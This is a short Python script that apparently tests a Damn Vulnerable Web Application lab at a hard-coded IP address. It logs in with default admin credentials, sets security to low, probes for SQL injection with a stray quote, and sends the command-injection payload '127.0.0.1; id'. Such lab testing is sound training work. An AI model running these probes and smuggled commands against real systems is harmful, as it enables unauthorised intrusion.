import httpx
import asyncio

async def test():
    async with httpx.AsyncClient(timeout=10) as client:
        # 先登录
        r = await client.get('http://47.95.192.41:8081/login.php')
        r = await client.post('http://47.95.192.41:8081/login.php', 
            data={'username': 'admin', 'password': 'password', 'Login': 'Login'},
            follow_redirects=False)
        
        # 设置安全等级
        r = await client.get('http://47.95.192.41:8081/security.php?security=low&seclev_submit=Submit')
        
        # 测试 SQLi
        r = await client.get('http://47.95.192.41:8081/vulnerabilities/sqli/?id=1')
        print(f'Normal: {r.status_code}, len={len(r.text)}')
        
        # 单引号注入
        r2 = await client.get("http://47.95.192.41:8081/vulnerabilities/sqli/?id=1'")
        print(f'Inject: {r2.status_code}, len={len(r2.text)}')
        
        if 'error' in r2.text.lower() or 'syntax' in r2.text.lower():
            print('SQLi detected!')
            import re
            m = re.search(r'(error in your SQL syntax[^<]{0,100})', r2.text, re.I)
            if m:
                print(f'Error: {m.group(1)}')
        
        # CMDi 测试
        r3 = await client.post('http://47.95.192.41:8081/vulnerabilities/exec/',
            data={'ip': '127.0.0.1; id', 'Submit': 'Submit'})
        print(f'CMDi: {r3.status_code}, len={len(r3.text)}')
        if 'uid=' in r3.text:
            import re
            m = re.search(r'(uid=\d+[^<\n]{0,50})', r3.text)
            if m:
                print(f'CMDi detected: {m.group(1)}')

asyncio.run(test())
